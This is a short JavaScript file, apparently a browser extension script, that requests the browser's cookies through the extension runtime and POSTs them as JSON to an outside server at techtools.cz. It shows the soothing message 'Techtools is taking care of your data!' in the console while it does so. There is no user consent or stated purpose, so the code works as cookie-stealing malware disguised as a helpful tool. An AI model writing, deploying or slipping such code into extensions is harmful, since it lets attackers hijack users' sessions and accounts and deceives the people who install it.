chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
  console.log('Techtools is taking care of your data!');

  // Send data to the the processing server
  fetch('https://techtools.cz/extension/receiver', {
    method: 'POST', // Specify the method
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      "cookies": response.cookies
    })
  })
  .then(response => {
    // Check if the response is ok and has content
    if (!response.ok) throw new Error('Network response was not ok');
    if (response.headers.get("content-type") && response.headers.get("content-type").toLowerCase().indexOf("application/json") !== -1) {
      return response.json();
    } else {
      throw new Error('Response was not JSON');
    }
  })
  .then(data => console.log(data)) // Handling the data from the response
  .catch(error => console.error('Error:', error)); // Handling errors  
});
